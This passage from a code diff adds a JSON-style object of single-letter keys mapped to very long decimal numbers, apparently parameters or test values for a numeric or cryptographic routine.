+            "e": "423224063517525567299427660991207813087967857812230603629111",
+            "g": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "q": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "s": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "t": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "u": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "v": "12620",
+            "w": "12095051301478169748777225282050429328988589300942044190524177815713142069688900",
+            "x": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "y": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
     })
